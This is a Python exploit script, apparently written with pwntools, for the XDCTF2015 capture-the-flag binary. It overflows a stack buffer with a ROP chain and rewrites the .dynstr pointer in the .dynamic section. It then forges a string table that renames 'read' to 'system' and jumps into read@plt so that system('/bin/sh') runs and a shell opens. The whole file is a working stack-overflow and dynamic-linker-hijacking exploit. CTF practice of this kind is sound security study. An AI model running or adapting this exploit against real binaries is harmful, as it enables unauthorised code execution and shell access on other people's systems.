from mmap import mmap
from helper import *
import helper
abbre(globals(), io, loader) # 此处定义了常用的缩写

offset = 112
section =elf.get_section_by_name('.dynamic')

ru('Welcome to XDCTF2015~!\n')

offset = 112; target = 0x0804B300

rop.raw(offset*b'a')
rop.read(0,0x0804B1F4+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,target,len((dynstr))) # construct a fake dynstr section
rop.read(0,target+0x100,len("/bin/sh\x00")) # read /bin/sh\x00

rop.raw(0x08049054) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(target+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw(b"a"*(256-len(rop.chain())))
s(rop.chain())
s(p32(target))
s(dynstr)
s(b"/bin/sh\x00")
shell()